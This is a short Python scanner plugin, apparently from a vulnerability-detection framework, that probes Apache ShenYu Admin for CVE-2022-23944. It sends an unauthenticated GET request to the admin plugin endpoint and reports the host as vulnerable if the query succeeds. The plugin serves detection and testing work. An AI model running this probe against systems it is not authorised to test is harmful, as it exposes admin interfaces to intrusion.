# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Apache ShenYu Admin plugin 未授权访问漏洞",
        "description": "Apache ShenYu Admin存在授权问题漏洞,该漏洞源于ShenyuAdminBootstrap中JWT的错误使用允许攻击者绕过身份验证。",
        "references": [
            "https://github.com/apache/incubator-shenyu/pull/2462/files",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23944"
        ]
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./plugin',
            timeout=15,
            follow_redirects=False,
        )
        if r.status_code == 200 and '"message":"query success"' in r.text and '"code":200' in r.text:
            return {"LoopholeInfo": self.__info__}
